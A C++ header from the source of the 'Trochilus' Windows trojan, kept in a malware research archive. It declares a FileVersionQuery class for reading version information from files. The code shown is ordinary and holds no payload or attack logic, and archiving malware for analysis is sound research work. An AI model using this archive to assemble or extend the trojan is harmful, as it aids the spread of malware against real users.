/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "../AutoCleanup.h"
#include "FileVersionData.h"

class FileVersionQuery
{
public:
	FileVersionQuery();
	~FileVersionQuery();

public:
	BOOL Open(LPCTSTR filepath);
	BOOL QueryValue(LPCTSTR subBlock, CString& value);
	BOOL QueryValue(VERSION_ITEM subBlock, CString& value);
	
private:
	LPCTSTR GetSubBlock(VERSION_ITEM item) const;

private:
	ByteBuffer	m_buffer;
	CString		m_format;
};
